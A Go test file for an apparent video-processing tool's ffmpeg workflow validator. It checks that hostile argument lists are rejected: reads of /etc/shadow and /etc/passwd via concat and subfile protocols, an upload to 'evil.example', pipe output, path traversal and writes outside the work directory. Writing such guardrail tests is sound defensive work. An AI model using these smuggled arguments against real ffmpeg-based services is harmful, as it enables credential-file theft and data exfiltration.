package frames

import (
	"strings"
	"testing"

	"github.com/vismod/vismod/internal/config"
)

func ffCfg() config.FFmpegConfig {
	return config.FFmpegConfig{
		FFmpegPath: "ffmpeg", FFprobePath: "ffprobe",
		DefaultWorkflow: "scene-detect", MaxFrames: 64, MaxWidth: 1280,
		Workflows: config.DefaultWorkflows(),
	}
}

func TestDefaultWorkflowsValidate(t *testing.T) {
	if err := ValidateAll(ffCfg()); err != nil {
		t.Fatalf("shipped defaults must validate: %v", err)
	}
}

func TestGuardrailsRejectHostileWorkflows(t *testing.T) {
	base := []string{"-hide_banner", "-nostdin", "-y", "-i", "{{.Input}}"}
	out := "{{.WorkDir}}/frame-%06d.png"

	tests := []struct {
		name    string
		args    []string
		wantErr string
	}{
		{"second input injection",
			append(append([]string{}, base...), "-i", "/etc/shadow", out),
			"exactly one"},
		{"http exfiltration output",
			append(append([]string{}, base...), "http://evil.example/upload"),
			"forbidden protocol"},
		{"concat arbitrary file read",
			[]string{"-nostdin", "-i", "{{.Input}}", "-f", "concat:/etc/passwd", out},
			"forbidden protocol"},
		{"pipe protocol",
			[]string{"-nostdin", "-i", "{{.Input}}", "pipe:1"},
			"forbidden protocol"},
		{"subfile read",
			[]string{"-nostdin", "-i", "{{.Input}}", "subfile,,start,0,end,0:/etc/passwd", out},
			"forbidden protocol"},
		{"file: traversal",
			[]string{"-nostdin", "-i", "{{.Input}}", "file:../../secret", out},
			"forbidden protocol"},
		{"output escapes workdir",
			append(append([]string{}, base...), "/tmp/frames-%06d.png"),
			"output confinement"},
		{"workdir only in output",
			[]string{"-nostdin", "-i", "{{.Input}}", "-passlogfile", "{{.WorkDir}}/log", out},
			"only permitted in the final output"},
		{"unknown placeholder",
			[]string{"-nostdin", "-i", "{{.Input}}", "-vf", "scale={{.Secret}}", out},
			"unknown placeholder"},
		{"input embedded in expression",
			[]string{"-nostdin", "-i", "{{.Input}}", "-vf", "movie={{.Input}}", out},
			"standalone"},
		{"input not after -i",
			[]string{"-nostdin", "-i", "x.mp4", "{{.Input}}", out},
			"" /* any of the -i pairing errors */},
		{"absolute path smuggling",
			[]string{"-nostdin", "-i", "{{.Input}}", "-passlogfile", "/var/log/x", out},
			"absolute paths"},
		{"empty args", nil, "empty args"},
	}
	cfg := ffCfg()
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateWorkflow("hostile", config.WorkflowConfig{Args: tc.args}, cfg)
			if err == nil {
				t.Fatalf("hostile workflow must be rejected: %v", tc.args)
			}
			if tc.wantErr != "" && !strings.Contains(err.Error(), tc.wantErr) {
				t.Errorf("error %q should mention %q", err, tc.wantErr)
			}
		})
	}
}

func TestValidateAllRejectsMissingDefault(t *testing.T) {
	cfg := ffCfg()
	cfg.DefaultWorkflow = "nope"
	if err := ValidateAll(cfg); err == nil {
		t.Error("undefined default_workflow must fail")
	}
}

func TestValidateRejectsZeroMaxFrames(t *testing.T) {
	cfg := ffCfg()
	cfg.MaxFrames = 0
	if err := ValidateAll(cfg); err == nil {
		t.Error("max_frames=0 must fail (required hard cap)")
	}
}

func TestRenderWorkflow(t *testing.T) {
	wf := config.DefaultWorkflows()["interval"]
	args, err := RenderWorkflow(wf, TemplateValues{
		Input: "/data/in.mp4", WorkDir: "/work/dir", MaxFrames: 8, MaxWidth: 640,
	})
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "/data/in.mp4") || !strings.Contains(joined, "/work/dir/frame-%06d.png") {
		t.Errorf("render missing substitutions: %v", args)
	}
	if !strings.Contains(joined, "-frames:v 8") || !strings.Contains(joined, "scale=640:-1") {
		t.Errorf("typed values not substituted: %v", args)
	}
	if args[0] != "-hide_banner" && args[0] != "-nostdin" {
		t.Errorf("unexpected first arg: %v", args[0])
	}
}

func TestRenderAddsNostdinWhenMissing(t *testing.T) {
	wf := config.WorkflowConfig{Args: []string{"-i", "{{.Input}}", "{{.WorkDir}}/f-%d.png"}}
	args, err := RenderWorkflow(wf, TemplateValues{Input: "a", WorkDir: "b", MaxFrames: 1, MaxWidth: 1})
	if err != nil {
		t.Fatal(err)
	}
	if args[0] != "-nostdin" {
		t.Errorf("-nostdin must be enforced: %v", args)
	}
}
